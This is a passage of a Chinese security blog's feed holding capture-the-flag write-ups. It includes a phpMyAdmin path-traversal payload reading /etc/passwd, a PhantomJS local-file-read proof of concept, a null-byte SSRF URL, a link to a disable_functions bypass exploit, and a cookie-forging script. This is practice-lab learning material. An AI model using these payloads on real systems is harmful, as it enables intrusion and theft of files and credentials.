src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525113128509.png" alt="" loading="lazy"></p><p>然而我们并不能直接执行这个readflag文件，因为<strong>phpinfo</strong>中的<strong>disable_functions</strong>选项禁用了很多命令执行函数：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200525113418596.png" alt="" loading="lazy"></p><p>于是有要想办法bypass  disable_functions来执行命令了，在网站找到可以直接执行命令的exp：</p><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p><p>直接传到网站的tmp目录下，我们具有tmp目录所有权限，令exp中<code>pwn(&quot;/readflag&quot;);</code>再发包<code>include(&#39;/tmp/exploits.php&#39;);</code>经过base64编码后的数据，即可读到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;2019GXYCTF—Ping-Ping-Ping&quot;&gt;&lt;a href=&quot;#2019GXYCTF—Ping-Ping-Ping&quot; class=&quot;headerlink&quot; title=&quot;2019GXYCTF—Ping Ping Ping&quot;&gt;&lt;/a&gt;2019GXYCTF—Ping Ping Ping&lt;/h3&gt;&lt;p&gt;12月份的GWYCTF，BUUCTF上复现&lt;/p&gt;
&lt;p&gt;别人学校招新的题目，我还是不会，太菜了&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="命令注入" scheme="https://www.extrader.top/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>CVE</title>
    <link href="https://www.extrader.top/2020/03/03/CVE/"/>
    <id>https://www.extrader.top/2020/03/03/CVE/</id>
    <published>2020-03-02T16:00:00.000Z</published>
    <updated>2020-07-14T10:42:12.088Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CVE-2018-12613"><a href="#CVE-2018-12613" class="headerlink" title="CVE-2018-12613"></a>CVE-2018-12613</h3><p><strong>2019GWCTF—我有一个数据库</strong></p><p>核心—————–phpmyadmin[CVE-2018-12613]</p><p>利用dirb扫到phpmyadmin后台</p><p>利用该漏洞可进行任意文件读取</p><a id="more"></a><pre class=" language-powershell"><code class="language-powershell">?target=db_sql<span class="token punctuation">.</span>php<span class="token operator">%</span>253f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd?target=db_sql<span class="token punctuation">.</span>php<span class="token operator">%</span>253f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>flag</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CVE/image-179.png" alt="" loading="lazy"></p><p>漏洞复现介绍与利用：</p><ul><li>首发：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="noopener">ChaMd5安全团队</a></li><li>大专栏：<a href="https://www.dazhuanlan.com/2019/09/28/5d8ebdd8af9b2/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/09/28/5d8ebdd8af9b2/</a></li><li>Freebuf：<a href="https://www.freebuf.com/column/207707.html" target="_blank" rel="noopener">https://www.freebuf.com/column/207707.html</a></li></ul><h3 id="CVE-2019-17221"><a href="#CVE-2019-17221" class="headerlink" title="CVE-2019-17221"></a>CVE-2019-17221</h3><p><strong>WEB_RemoteImageDownloader</strong></p><p>核心—————–PhantomJS任意文件读取[CVE-2019-17221]</p><p><a href="https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/" target="_blank" rel="noopener">Breaching the perimeter – PhantomJs Arbitrary file read</a></p><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E6%94%B6%E9%9B%86/image-20200506121650092.png" alt="" loading="lazy"></p><p>POC</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  x<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">;</span>  x<span class="token punctuation">.</span>onload<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  x<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"file:///flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  x<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>将html保存到自己的公网ip上，然后题目界面下载即可，最后得到flag的图片</p><h3 id="CVE-2020-7066"><a href="#CVE-2020-7066" class="headerlink" title="CVE-2020-7066"></a>CVE-2020-7066</h3><p>CVE介绍：</p><pre><code>    In PHP versions 7.2.x below 7.2.29, 7.3.x below 7.3.16 and 7.4.x below 7.4.4, while using get_headers() with user-supplied URL, if the URL contains zero (\0) character, the URL will be silently truncated at it. This may cause some software to make incorrect assumptions about the target of the get_headers() and possibly send some information to a wrong server.</code></pre><p>PHP 7.2.29之前的7.2.x版本、7.3.16之前的7.3.x版本和7.4.4之前的7.4.x版本中的<code>get_headers()</code>函数存在安全漏洞</p><p>将<code>get_headers()</code>与用户提供的URL一起使用时，如果URL包含零<code>(\0)</code>字符，则URL将被静默地截断。这可能会导致某些软件对<code>get_headers()</code>的目标做出错误的假设，并可能将某些信息发送到错误的服务器。</p><p><strong>[GKCTF2020]cve版签到</strong></p><p>点进去题目</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200625130103332.png" alt="" loading="lazy"></p><p>点击View CTFHub后Url请求一个get参数，<code>?url=http://www.ctfhub.com</code>，看着像SSRF，再结合题目提示这个CVE漏洞，还有在请求返回头里有一个<code>Hint：Flag in localhost</code></p><p>于是请求：<code>?url=http://localhost%00.ctfhub.com</code>得到如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200625130420379.png" alt="" loading="lazy"></p><p>于是请求<code>?url=http://127.0.0.123%00.ctfhub.com</code>，得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;CVE-2018-12613&quot;&gt;&lt;a href=&quot;#CVE-2018-12613&quot; class=&quot;headerlink&quot; title=&quot;CVE-2018-12613&quot;&gt;&lt;/a&gt;CVE-2018-12613&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;2019GWCTF—我有一个数据库&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;核心—————–phpmyadmin[CVE-2018-12613]&lt;/p&gt;
&lt;p&gt;利用dirb扫到phpmyadmin后台&lt;/p&gt;
&lt;p&gt;利用该漏洞可进行任意文件读取&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="CVE" scheme="https://www.extrader.top/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>其它</title>
    <link href="https://www.extrader.top/2020/03/01/%E5%85%B6%E5%AE%83/"/>
    <id>https://www.extrader.top/2020/03/01/%E5%85%B6%E5%AE%83/</id>
    <published>2020-02-29T16:00:00.000Z</published>
    <updated>2020-07-14T10:40:36.161Z</updated>
    
    <content type="html"><![CDATA[<h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><h2 id="百度杯九月场Code"><a href="#百度杯九月场Code" class="headerlink" title="百度杯九月场Code"></a>百度杯九月场Code</h2><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219214921326.png" alt="" loading="lazy"></p><p>url：<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=hei.jpg</code>，查看源码：</p><a id="more"></a><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219215138731.png" alt="" loading="lazy"></p><p>猜测存在文件包含读取文件操作，于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=index.php</code>查看源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219215307566.png" alt="" loading="lazy"></p><p>base64解密后得到index.php的源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'jpg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Refresh:0;url=./index.php?jpg=hei.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'jpg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;title>file:'</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'&lt;/title>'</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">,</span><span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;img src='data:image/gif;base64,"</span><span class="token punctuation">.</span><span class="token variable">$txt</span><span class="token punctuation">.</span><span class="token string">"'>&lt;/img>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* * Can you find the flag file? * */</span><span class="token delimiter">?></span></code></pre><p>注意注释里的这话句<code>Created by PhpStorm</code>，是用<code>PhpStorm</code>编辑器写的，用这个编辑器写的工程文件下会有一个<code>.idea</code>文件夹，<a href="https://segmentfault.com/q/1010000008644646" target="_blank" rel="noopener">详</a>，类似于这个项目的根目录文件，里面包含了一些xml文件（配置）。</p><p>于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/.idea/workspace.xml</code>得到一个xml页面，提取其中有用信息</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219220208401.png" alt="" loading="lazy"></p><p>结合<code>index.php</code>的源码利用<code>config</code>代替<code>_</code>，于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=fl3gconfigichuqiu.php</code>得到<code>fl3g_ichuqiu.php</code>的源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span><span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">,</span> <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$max</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$hash</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$max</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$hash</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$tmp</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$rnd</span><span class="token operator">=</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$key</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$rnd</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$ttmp</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$txt</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$key</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$s</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$rnd</span><span class="token punctuation">.</span><span class="token variable">$ttmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$txt</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$rnd</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$key</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$rnd</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$tmp</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$txt</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$s</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$tmp1</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$tmp1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">,</span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token string">'guest'</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"╮(╯▽╰)╭"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>发现分别有一个加密函数，一个解密函数，分析php代码；</p><p>当传入<code>cookie</code>中的<code>user</code>的值经过<code>decrypt</code>函数后返回的值为<code>system</code>，就可以得到flag，所以我们需要得到一串base64码，这一串base64经过<code>decrypt</code>函数能解出<code>system</code>，于是</p><p>由<code>guest</code>可以逆推出<code>rnd</code>的值和md5加密后<code>key</code>值的前5位；</p><p>再由<code>key</code>的前5位得出所有前6位可能的值，再通过<code>decrypt</code>函数逆推出函数中<code>$txt</code>值的后6位，再在前面加上<code>$rnd</code>的值经过base64加密后得到的16个可能的<code>user</code>值，再拿16个值去bp进行爆破，即可得到flag</p><p>写出解密脚本，得到<code>rnd</code>和md5加密后的<code>key</code>值</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64session <span class="token operator">=</span> <span class="token string">'OFZhSEdLVxga'</span><span class="token comment" spellcheck="true">#本地user值</span>txt <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>session<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>rnd <span class="token operator">=</span> txt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#拿到rnd的值</span>ttemp <span class="token operator">=</span> txt<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>guest <span class="token operator">=</span> <span class="token string">'guest'</span>tmp <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>guest<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>guest<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>ttemp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> ord<span class="token punctuation">(</span>ttemp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#拿到key</span>system <span class="token operator">=</span> <span class="token string">'system'</span>system1 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    system1 <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>system<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>md5 <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span><span class="token comment" spellcheck="true">#经过md5加密后的每一位数都是0-f之间的数</span>key_new <span class="token operator">=</span> <span class="token string">''</span>cookie_new <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>md5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#循环出所有可能的结果</span>    key_new  <span class="token operator">=</span> key <span class="token operator">+</span> md5<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    session_new <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>system1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        session_new <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>key_new<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> ord<span class="token punctuation">(</span>system1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    session_new <span class="token operator">=</span> rnd <span class="token operator">+</span> session_new    cookie_new <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>session_new<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cookie_new<span class="token punctuation">)</span></code></pre><p>运行脚本得到16个base64加密后的值</p><p>按理说原题利用bp是可以爆破的出来的，但是这个题目不知道是环境的问题还是什么原因，后端的user值一直在变，意思是说<code>rnd</code>值一直在变，那md5加密后的<code>key</code>值也会变，脚本就毫无意义，所以无果，还是我哪里理解错了。。。。。先放这里，等我啥时候想明白了，或者哪位大佬告诉我原因了再补上。</p><p>我来填坑了，上面一步我还是理解错了，刷新界面就算会再次执行php脚本，但也会在比较完<code>$username</code>的值后再进入else函数再执行一遍<code>encrypt</code>函数回显一个新的<code>cookie</code>，所以不用考虑<code>user</code>的值会变的问题，因为在他变之前如果我们已经判断出<code>$username</code>==<code>system</code>了，就会成功拿到flag，而后台不会再调用<code>encrypt</code>函数生成新的<code>user</code>，所以这里是没有问题的，但是爆破的时候还是爆破不出来，为什么呢？我可是怀疑我的python脚本</p><p>在网上找个php脚本来执行一下看看二者得出来的base64有什么区别</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$txt1</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span>    <span class="token 